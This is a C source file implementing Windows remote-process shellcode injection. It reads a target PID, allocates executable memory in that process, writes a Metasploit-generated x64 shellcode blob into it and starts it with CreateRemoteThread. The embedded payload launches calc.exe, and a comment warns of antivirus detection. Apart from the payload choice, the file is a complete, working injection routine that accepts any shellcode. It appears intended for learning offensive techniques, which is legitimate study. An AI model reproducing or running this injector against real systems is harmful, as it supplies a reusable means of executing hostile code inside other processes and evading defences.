#include <stdio.h>
#include <tchar.h>
#include <Windows.h>

// reference
// Gray Hat Python: Python Programming for Hackers and Reverse Engineers
// http://en.wikipedia.org/wiki/Data_Execution_Prevention
// https://aljensencprogramming.wordpress.com/2015/04/21/review-of-console-io-with-win32-functions/

// msfpayload windows/x64/exec CMD=c:\\Windows\\System32\\calc.exe C
unsigned char payload[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x3a\x5c"
"\x57\x69\x6e\x64\x6f\x77\x73\x5c\x53\x79\x73\x74\x65\x6d\x33"
"\x32\x5c\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

int readPID()
{
	int result = 0;
	_TCHAR buff[255];
	DWORD readed = 0;

	HANDLE hInput = GetStdHandle(STD_INPUT_HANDLE);

	if (hInput == NULL)
	{
		return 0;
	}

	if (ReadConsole(hInput, buff, sizeof(buff), &readed, NULL))
	{
		result = _tstoi(buff);
	}

	CloseHandle(hInput);

	return result;
}

int _tmain(int argc, _TCHAR* argv[])
{
	// !!Antivirus warrning!!

	printf("PID: ");
	int processID = readPID();

	if (processID == 0)
	{
		return 0;
	}

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);

	if (!hProcess)
	{
		return 0;
	}

	LPVOID memoryAddress = VirtualAllocEx(hProcess, 0, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!memoryAddress)
	{
		return 0;
	}

	SIZE_T writen = 0;
	if (WriteProcessMemory(hProcess, memoryAddress, payload, sizeof(payload), &writen) == FALSE)
	{
		return 0;
	}

	DWORD threadID = 0;
	HANDLE hTread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)memoryAddress, NULL, 0, &threadID);
	if (!hTread)
	{
		// check same architecture type
		DWORD errorCode = GetLastError();
		return 0;
	}

	return 0;
}
